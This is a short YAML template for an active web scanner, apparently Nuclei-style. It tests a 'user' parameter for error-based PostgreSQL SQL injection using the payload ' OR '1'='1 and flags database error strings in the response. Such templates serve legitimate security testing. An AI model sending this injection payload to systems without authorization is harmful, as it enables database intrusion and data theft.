id: patt-sqli-pg-err-01-user
name: 'PATT sqli patt-sqli-pg-err-01 via user'
severity: high
type: active
tags:
  - sqli
  - patt
requires:
  - python
  - django
description: 'PATT PG error-based generic. [patt:patt-sqli-pg-err-01] [patt_source:https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/SQL%20Injection/PostgreSQL%20Injection.md]'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      user:
        - ''' OR ''1''=''1'
    matchers:
      - type: regex
        part: body
        regex:
          - 'PostgreSQL'
          - 'pg_query'
          - 'ERROR: syntax error'
